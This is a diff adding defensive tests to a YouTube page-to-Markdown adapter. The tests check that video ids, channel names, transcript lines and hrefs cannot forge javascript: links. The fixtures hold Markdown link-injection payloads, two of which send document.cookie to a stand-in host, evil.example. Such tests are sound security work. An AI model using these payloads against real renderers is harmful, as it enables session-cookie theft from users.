@@ -104,3 +104,39 @@ test("a bare og:title is still enough to beat the player shell", () => {
   assert.match(out.markdown, /# A talk with no transcript/);
   assert.match(out.markdown, /Slides are in the description\./);
 });
+
+test("a video id out of the URL cannot become part of a link target", () => {
+  // watchUrl is built from ?v= and is then the target of every transcript
+  // deep link, so an id carrying Markdown punctuation writes those links.
+  const [yt] = g.MonoAdapters.all().filter((a) => a.name === "youtube");
+  for (const hostile of ["x)](javascript:alert(1))", "abc def", "a/b", "x#y"]) {
+    const url = `https://www.youtube.com/watch?v=${encodeURIComponent(hostile)}`;
+    assert.equal(yt.match({ url }), false, `${JSON.stringify(hostile)} is not a video id`);
+    assert.equal(run(url, fixture("youtube.html")), null, "so the generic pipeline gets the page");
+  }
+
+  // And the shape it does accept is still every shape YouTube really uses.
+  assert.ok(yt.match({ url: WATCH }));
+  assert.ok(yt.match({ url: "https://www.youtube.com/shorts/abc123" }));
+  assert.ok(yt.match({ url: "https://youtu.be/dQw4w9WgXcQ" }));
+});
+
+test("markdown syntax in a channel name or a transcript line cannot forge a link", () => {
+  const html = fixture("youtube.html")
+    .replace(">Coastal Archive<", ">Coastal](javascript:fetch('//evil.example/'+document.cookie)) Archive<")
+    .replace("The drawer was painted shut", "The drawer](javascript:alert(2)) was painted shut");
+  const out = run(WATCH, html);
+
+  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
+});
+
+test("a channel href cannot close its own link target", () => {
+  // The href is made absolute, so the scheme is safe — but an unescaped ")"
+  // ends the (...) early and whatever follows becomes Markdown.
+  const html = fixture("youtube.html").replace(
+    'href="/@coastalarchive"',
+    `href="/@coastalarchive)](javascript:fetch('//evil.example/'+document.cookie))"`
+  );
+  const out = run(WATCH, html);
+  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
+});
